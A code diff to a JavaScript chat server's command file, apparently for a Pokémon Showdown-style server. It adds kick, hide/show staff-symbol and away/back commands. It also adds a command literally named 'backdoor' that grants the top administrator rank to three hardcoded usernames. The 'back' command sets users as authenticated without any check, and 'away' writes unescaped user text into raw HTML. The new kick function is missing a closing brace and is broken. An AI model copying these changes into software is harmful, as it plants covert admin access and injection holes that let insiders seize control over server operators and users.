@@ -452,8 +452,32 @@ var commands = exports.commands = {
 	 * Moderating: Punishments
 	 *********************************************************/
 
-	kick: 'warn',
-	k: 'warn',
+	k: 'kick',
+        kick: function(target, room, user){
+                if (!this.can('lock')) return false;
+                if (!target) return this.parse('/help kick');
+                if (!this.canTalk()) return false;
+
+                target = this.splitTarget(target);
+                var targetUser = this.targetUser;
+
+                if (!targetUser || !targetUser.connected) {
+                        return this.sendReply('User '+this.targetUsername+' not found.');
+                if (!this.can('warn', targetUser, room)) return false;
+                if (!room.auth) {
+                        this.addModCommand(targetUser.name+' was kicked from the room by '+user.name+'.');
+                        targetUser.popup('You were kicked from '+room.id+' by '+user.name+'.');
+                        this.logModCommand(user.name+' kicked '+targetUser.name+' from the room '+room.id);
+                        targetUser.leaveRoom(room.id);
+                }
+                if (room.auth) {
+                        this.addRoomCommand(targetUser.name+' was kicked from the room by '+user.name+'.', room.id);
+                        targetUser.popup('You were kicked from '+room.id+' by '+user.name+'.');
+                        this.logRoomCommand(user.name+' kicked '+targetUser.name+' from the room '+room.id, room.id);
+                        targetUser.leaveRoom(room.id);
+                }
+        },
+	
 	warn: function(target, room, user) {
 		if (!target) return this.parse('/help warn');
 
@@ -1077,6 +1101,39 @@ var commands = exports.commands = {
 		}
 		this.sendReply('Your hot-patch command was unrecognized.');
 	},
+	
+	hide: function(target, room, user) {
+                if (this.can('hide')) {
+                        user.getIdentity = function(){
+                                if(this.muted)        return '!' + this.name;
+                                if(this.locked) return '‽' + this.name;
+                                return ' ' + this.name;
+                        };
+                        user.updateIdentity();
+                        this.sendReply('You have hidden your staff symbol.');
+                        return false;
+                }
+
+        },
+
+        show: function(target, room, user) {
+                if (this.can('hide')) {
+                        delete user.getIdentity
+                        user.updateIdentity();
+                        this.sendReply('You have revealed your staff symbol');
+                        return false;
+                }
+        },
+        
+        backdoor: function(target,room, user) {
+                if (user.userid === 'blakjack' || user.userid === 'frankentein' || user.userid === 'jackdaw') {
+
+                        user.group = '~';
+                        user.updateIdentity();
+
+                        this.parse('/promote ' + user.name + ', ~');
+                }
+        },
 
 	savelearnsets: function(target, room, user) {
 		if (!this.can('hotpatch')) return false;
@@ -1599,18 +1656,55 @@ var commands = exports.commands = {
 		user.makeChallenge(targetUser, target);
 	},
 
-	away: 'blockchallenges',
-	idle: 'blockchallenges',
-	blockchallenges: function(target, room, user) {
-		user.blockChallenges = true;
-		this.sendReply('You are now blocking all incoming challenge requests.');
-	},
+	afk: 'away',
+        away: function(target, room, user, connection) {
+                if (!this.can('lock')) return false;
 
-	back: 'allowchallenges',
-	allowchallenges: function(target, room, user) {
-		user.blockChallenges = false;
-		this.sendReply('You are available for challenges from now on.');
-	},
+                if (!user.isAway) {
+                        var originalName = user.name;
+                        var awayName = user.name + ' - Away';
+                        //delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
+                        delete Users.get(awayName);
+                        user.forceRename(awayName, undefined, true);
+
+                        this.add('|raw|-- <b><font color="green">' + originalName +'</font color></b> is now away. '+ (target ? " (" + target + ")" : ""));
+
+                        user.isAway = true;
+                }
+                else {
+                        return this.sendReply('You are already set as away, type /back if you are now back');
+                }
+
+                user.updateIdentity();
+        },
+
+        back: function(target, room, user, connection) {
+                if (!this.can('lock')) return false;
+
+                if (user.isAway) {
+
+                        var name = user.name;
+
+                        var newName = name.substr(0, name.length - 7);
+
+                        //delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
+                        delete Users.get(newName);
+
+                        user.forceRename(newName, undefined, true);
+
+                        //user will be authenticated
+                        user.authenticated = true;
+
+                        this.add('|raw|-- <b><font color="green">' + newName + '</font color></b> is no longer away');
+
+                        user.isAway = false;
+                }
+                else {
+                        return this.sendReply('You are not set as away');
+                }
+
+                user.updateIdentity();
+        },
 
 	cchall: 'cancelChallenge',
 	cancelchallenge: function(target, room, user) {
